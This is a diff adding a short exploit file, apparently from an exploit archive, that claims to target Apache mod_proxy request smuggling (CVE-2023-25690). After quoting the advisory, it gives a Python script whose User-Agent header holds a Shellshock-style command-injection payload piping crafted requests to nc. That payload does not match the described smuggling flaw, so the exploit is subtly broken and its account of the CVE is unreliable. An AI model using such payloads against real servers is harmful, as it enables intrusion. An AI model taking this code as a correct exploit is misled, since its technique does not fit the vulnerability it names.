@@ -1,0 +1,36 @@
+id: 39214
+date: 01/02/2024
+title: Apache 2.4.55 mod_proxy HTTP Request Smuggling Exploit
+author: Amirhossein Bahramizadeh
+cves: CVE-2023-25690
+
+# Some mod_proxy configurations on Apache HTTP Server versions 2.4.0 through
+# 2.4.55 allow a HTTP Request Smuggling attack. Configurations are affected
+# when mod_proxy is enabled along with some form of RewriteRule or
+# ProxyPassMatch in which a non-specific pattern matches some portion of the
+# user-supplied request-target (URL) data and is then re-inserted into the
+# proxied request-target using variable substitution. For example, something
+# like: RewriteEngine on RewriteRule "^/here/(.*)" "
+# http://example.com:8080/elsewhere?$1"; [P] ProxyPassReverse /here/
+# http://example.com:8080/ Request splitting/smuggling could result in bypass
+# of access controls in the proxy server, proxying unintended URLs to
+# existing origin servers, and cache poisoning. Users are recommended to
+# update to at least version 2.4.56 of Apache HTTP Server.
+
+import requests
+
+def send_exploit(proxy_url):
+    exploit_headers = {
+        'User-Agent': '() { :; }; /bin/echo -e "GET /here/../here HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /nonexistent HTTP/1.1\r\nHost: www.example.com\r\n\r\n" | nc example.com 80',
+        'Connection': 'close'
+    }
+
+    exploit_url = 'http://example.com/here/../here'
+    response = requests.get(exploit_url, headers=exploit_headers, proxies={'http': proxy_url, 'https': proxy_url})
+
+    print(response.text)
+
+# Usage
+send_exploit('http://localhost:8080')
+
+#  0day.today [2024-01-15]  #
